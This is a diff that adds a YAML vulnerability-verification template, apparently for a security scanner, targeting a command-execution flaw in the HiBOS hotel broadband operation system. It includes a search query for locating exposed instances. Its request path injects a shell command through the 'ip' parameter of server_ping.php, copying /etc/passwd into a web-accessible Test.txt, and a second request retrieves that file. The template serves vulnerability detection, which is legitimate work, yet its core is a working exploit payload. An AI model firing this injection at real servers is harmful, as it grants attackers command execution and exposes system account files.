@@ -1,0 +1,43 @@
+app: HiBOS
+query: body:"酒店宽带运营系统"
+meta:
+  name: HIBOS酒店宽带运营系统存在命令执行漏洞
+  level: 5
+  tags:
+    - remote_code_execution
+  description: HIBOS酒店宽带运营系统存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。
+  homepage: http://www.amttgroup.com
+  author: 一曲成殇
+  references: https://jcyj.chd.edu.cn/2021/0628/c5172a196359/page.htm
+  solution: 目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：http://www.amttgroup.com/
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: GET
+            path: /manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../Test.txt&id=1
+            redirect: true
+            header: [ ]
+            params: ""
+          response:
+            - name: body
+              value: parent.doTestResult
+              type: contains
+            - name: code
+              value: "200"
+              type: equals
+        - request:
+            method: GET
+            path: /Test.txt
+            redirect: true
+            header: [ ]
+            params: ""
+          response:
+            - name: code
+              value: "200"
+              type: equals
+            - name: body
+              value: /sbin/
+              type: contains
+  create_at: "2021-11-05 22:01:30"
